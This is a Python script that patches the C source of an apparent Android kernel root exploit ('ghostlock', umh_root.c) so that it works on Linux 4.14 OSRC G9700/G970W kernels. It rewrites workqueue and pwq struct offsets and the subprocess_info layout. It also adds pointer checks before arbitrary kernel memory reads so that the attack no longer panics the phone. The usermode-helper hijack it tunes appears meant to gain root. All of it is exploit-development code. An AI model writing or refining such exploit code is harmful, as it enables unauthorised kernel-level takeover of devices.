#!/usr/bin/env python3
import sys, os
CORE = os.path.expanduser("~/ghostlock/ghostlock-oneplus/src/core")

def patch(path, old, new):
    p = os.path.join(CORE, path)
    s = open(p, encoding="utf-8").read()
    if s.count(old) != 1:
        print("FAIL %s: %d occurrences of %r" % (path, s.count(old), old[:120])); sys.exit(1)
    open(p, "w", encoding="utf-8").write(s.replace(old, new))
    print("ok  %s" % path)

F = "umh_root.c"

# 1. 4.14 workqueue-internal offsets (DWARF of OSRC G9700 kernel/workqueue.c)
patch(F,
"""/* Workqueue internal struct offsets (kernel-internal, stable across 6.x) */
#define WQ_DFL_PWQ_OFF       0xb0
#define PWQ_POOL_OFF         0x00
#define PWQ_WQ_OFF           0x08
#define PWQ_WORK_COLOR_OFF   0x10
#define PWQ_REFCNT_OFF       0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF    0x5c
#define PWQ_MAX_ACTIVE_OFF   0x60
#define POOL_WORKLIST_OFF    0x28
#define POOL_NR_IDLE_OFF     0x3c
#define WORK_DATA_OFF        0x00
#define WORK_ENTRY_OFF       0x08
#define WORK_FUNC_OFF        0x18
""",
"""/* Workqueue internal struct offsets for Linux 4.14 (measured from the OSRC
 * G9700/G970W kernel/workqueue.c DWARF).  The previous values were 6.x and
 * read wq->dfl_pwq at the wrong slot (0xb0 = wq_dev) -> NULL pwq -> panic. */
#define WQ_DFL_PWQ_OFF       0xa8
#define PWQ_POOL_OFF         0x00
#define PWQ_WQ_OFF           0x08
#define PWQ_WORK_COLOR_OFF   0x10
#define PWQ_REFCNT_OFF       0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF    0x58
#define PWQ_MAX_ACTIVE_OFF   0x5c
#define POOL_WORKLIST_OFF    0x20
#define POOL_NR_IDLE_OFF     0x34
#define WORK_NR_COLORS_414   15
#define WORK_DATA_OFF        0x00
#define WORK_ENTRY_OFF       0x08
#define WORK_FUNC_OFF        0x18
""")

# 2. struct subprocess_info on 4.14: work_struct is 32 bytes, total 96 (was 48/112)
patch(F,
"""struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;""",
"""struct umh_subprocess_info {
  uint8_t work[32];   /* sizeof(struct work_struct) on 4.14 == 32 */
  uint64_t complete;""")

patch(F,
"""_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");""",
"""_Static_assert(sizeof(struct umh_subprocess_info) == 96,
               "subprocess_info layout (4.14)");""")

# 3. color bound: WORK_NR_COLORS == 15
patch(F,
"""  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {""",
"""  if (color >= WORK_NR_COLORS_414 || refcnt == 0 ||
      nr_active >= max_active) {""")

# 4. validate wq/pwq before dereferencing (avoid NULL-deref panic)
patch(F,
"""  uintptr_t wq = umh_read64(fd, wq_slot);
  pr_info("umh: step2 wq=%016zx\\n", (size_t)wq);
  fsync(1);
  uintptr_t pwq = umh_read64(fd, wq + WQ_DFL_PWQ_OFF);
  pr_info("umh: step2 pwq=%016zx\\n", (size_t)pwq);
  fsync(1);
  uintptr_t pool = umh_read64(fd, pwq + PWQ_POOL_OFF);""",
"""  uintptr_t wq = umh_read64(fd, wq_slot);
  pr_info("umh: step2 wq=%016zx\\n", (size_t)wq);
  fsync(1);
  if (!is_direct_ptr(wq)) {
    pr_error("umh: bad wq=%016zx\\n", (size_t)wq);
    return 0;
  }
  uintptr_t pwq = umh_read64(fd, wq + WQ_DFL_PWQ_OFF);
  pr_info("umh: step2 pwq=%016zx\\n", (size_t)pwq);
  fsync(1);
  if (!is_direct_ptr(pwq)) {
    pr_error("umh: bad pwq=%016zx\\n", (size_t)pwq);
    return 0;
  }
  uintptr_t pool = umh_read64(fd, pwq + PWQ_POOL_OFF);""")

print("done")
